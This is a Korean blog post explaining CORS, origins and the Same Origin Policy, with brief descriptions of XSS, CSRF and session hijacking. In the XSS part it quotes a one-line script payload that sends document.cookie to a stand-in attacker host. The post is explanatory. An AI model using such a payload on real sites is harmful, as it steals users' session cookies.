---
layout: post
title: CORS란?
author: balancelife
date: 2025-04-11 01:17:00 +0900 
categories: [CORS]
banner:
  opacity: 0.618
  background: "#000"
  height: "100vh"
  min_height: "38vh"
  heading_style: "font-size: 4.25em; font-weight: bold; text-decoration: underline"
  subheading_style: "color: gold"
tags: [CORS]
---

## CORS란?
CORS는 Cross-Origin Resource Sharing 교차 출처 자원 공유 라고 하는데 이를 이해하기 위해서 먼저 **origin** 이라는 것과 **SOP** 라는 것을 알아보자.

### Origin

우리가 어떤 사이트에 접속하고자 할 때 우리는 URL이라는 문자열을 통해 접근한다.
![](https://velog.velcdn.com/images/balancelife99/post/56c313b0-13c8-4bdf-9662-ef42d1b3dc94/image.png)

이 때 이 URL에서 Path와 Query string, Fragment라는 것을 제외한 protocol, host, port 의 영역을 Origin 이라고 한다!

### SOP
#### 자 그럼 SOP란 무엇이고 왜 알아야하냐?

SOP 는 Same Origin Policy 인데
CORS에 Cross Origin ... 과 반대 개념이라는 것을 알 수 있다
Same Origin <-> Cross Origin

-> SOP는 동일한 Origin 인 놈들끼리만 리소스를 공유할 수 있다! 라는 정책이다.

그렇다면 이 SOP가 필요한 이유가 뭘까?

### SOP 존재 이유

동일한 Origin 을 가진 URL들끼리만 리소스를 공유할 수 있지 않다면 우리는 보안적으로 취약해진다.

공격받을 수 있는 방법으로는 다음과 같은 방법들이 있다.


1. **크로스 사이트 스크립팅 (XSS)**:
   - 공격자가 웹 페이지에 악의적인 스크립트를 삽입하고, 이 스크립트가 다른 사용자의 브라우저에서 실행되게 함으로써 사용자의 쿠키를 탈취할 수 있습니다.
   - 예: `<script>document.location='http://attacker.com/cookie?'+document.cookie;</script>`

2. **크로스 사이트 요청 위조 (CSRF)**:
   - 사용자가 로그인한 상태에서 악의적인 웹페이지나 이메일을 통해 공격자가 조작한 요청을 서버에 보내게 함으로써 사용자의 의도와는 무관하게 중요한 작업을 수행하게 합니다.
   - 예: 사용자가 은행 서비스에 로그인한 상태에서 CSRF 공격을 받아 무심코 자신도 모르는 사이에 송금을 실행할 수 있습니다.

3. **세션 하이재킹 (Session Hijacking)**:
   - 공격자가 사용자의 세션 ID를 탈취하여 그 사용자로서 서버에 접속하고 서버는 공격자가 실제 사용자인 것처럼 인식합니다.

고로 SOP는 이렇게 우리를 악의적인 스크립트를 실행하지 않도록 지켜주는 소중한 녀석이었는데 웹이 발전하면서 우리는 다른 Origin을 가진 URL과도 통신을 해야했다.

그래서 등장한것이 CORS 이다.

---

### CORS
다시 CORS 를 봐보자.
Cross Origin Resource Sharing
즉 다른 Origin 을 가진 URL끼리도 리소스를 공유할 수 있게 해주는, 사실은 에러가 난다고 싫어할게 아니라 허용해주는 해결책인 착한놈이었다.
~~CORS야 미안해~~

즉  SOP 정책을 위반해도 CORS 정책에 따르면 다른 출처의 리소스라도 허용할 수 있는게 된다.

### 어떻게?

CORS 설정을 하려면 서버에서 Access-Control-Allow-Origin 헤더에 허용할 출처를 기재해서 클라이언트에 응답해야 한다. 
즉, 백엔드 개발자가 고쳐야될 부분이다.


#### 끝으로
CORS 가 무엇인지 대강은 알고, 백엔드 개발자가 해결해줘야 하는 부분이라는 점을 알고 한시름 놓게 되었지만 CORS가 작동하는 방식에 3가지 시나리오가 있다.

여기까지는 FE개발자라도 알아놓아야 한다니 다음 번에 CORS 작동방식에 대해 다뤄보겠다!


